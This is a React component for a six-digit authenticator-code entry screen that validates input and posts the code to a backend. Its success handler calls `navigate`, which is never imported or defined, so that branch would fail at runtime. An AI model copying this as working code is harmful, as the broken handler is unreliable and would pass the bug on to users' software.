import React, { useState } from "react";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as Yup from "yup";
import "../styles/otp.css"; // Assuming this is your CSS file
import logo from "../assets/logo.svg";
import axios from "axios";
import BASE_URL from "../components/urls";


// Yup schema validation for 6-digit code
const validationSchema = Yup.object().shape({
  code: Yup.string()
    .length(6, "Code must be exactly 6 digits")
    .matches(/^\d{6}$/, "Code must be numeric")
    .required("Code is required"),
});

const Otp = () => {
  const [code, setCode] = useState(["", "", "", "", "", ""]);
  const [customError, setCustomError] = useState(""); // For displaying custom error after submission

  const {
    register,
    handleSubmit,
    setValue,
    formState: { errors },
  } = useForm({
    resolver: yupResolver(validationSchema),
    defaultValues: {
      code: "",
    },
  });

  const onSubmit = (data) => {
    // Make POST request to your backend
    axios
      .post(`${BASE_URL}/otp`, data) // Endpoint for OTP verification
      .then((response) => {
        console.log(response.data);
        navigate("/otp"); // Redirect to OTP route on success
      })
      .catch((error) => {
        console.error("There was an error!", error);
        // Set custom error if submission fails
        setCustomError("Code expired! Put new code.");
      });

    // Clear the inputs after submission
    setCode(["", "", "", "", "", ""]);
    setValue("code", ""); // Clear the form value
  };

  const handleChange = (e, index) => {
    const value = e.target.value;
    if (!/^\d*$/.test(value)) return; // Allow only digits

    const newCode = [...code];
    newCode[index] = value;

    // Auto-focus to the next input if a number is entered
    if (value && index < 5) {
      document.getElementById(`codeInput-${index + 1}`).focus();
    }

    setCode(newCode);
    setValue(
      "code",
      newCode.join(""), // Set the full code as the input value in form
      { shouldValidate: true }
    );
    // Clear custom error on new input
    setCustomError("");
  };

  const handlePaste = (e) => {
    const paste = e.clipboardData.getData("text");
    if (!/^\d{6}$/.test(paste)) return; // Ensure pasted value is exactly 6 digits

    const pastedCode = paste.split("");
    setCode(pastedCode); // Set code state based on pasted data
    setValue("code", paste, { shouldValidate: true }); // Set full pasted code in form
    setCustomError(""); // Clear custom error on paste
  };

  const handleDelete = (e, index) => {
    if (e.key === "Backspace" && !code[index] && index > 0) {
      // Focus on the previous input if the current one is empty
      document.getElementById(`codeInput-${index - 1}`).focus();
    }
  };

  return (
    <div className="security-verification">
      <div className="loginHeader">
        <div>
          <img src={logo} alt="Logo" />
        </div>
      </div>
      <h2>Security Verification</h2>
      <p>Google Authenticator</p>
      <form onSubmit={handleSubmit(onSubmit)}>
        <div className="code-inputs" onPaste={handlePaste}>
          {code.map((num, index) => (
            <input
              key={index}
              type="text"
              maxLength="1"
              value={num}
              onChange={(e) => handleChange(e, index)}
              onKeyDown={(e) => handleDelete(e, index)}
              id={`codeInput-${index}`}
              className="code-input"
            />
          ))}
        </div>
        {/* Display form validation error */}
        {errors.code && <p className="error-text">{errors.code.message}</p>}
        {/* Display custom error message */}
        {customError && <p className="error-text">{customError}</p>}

        <button type="submit" className="confirm-btn">
          Confirm
        </button>
        <span className="hav">Having problems with verification?</span>
      </form>
    </div>
  );
};

export default Otp;
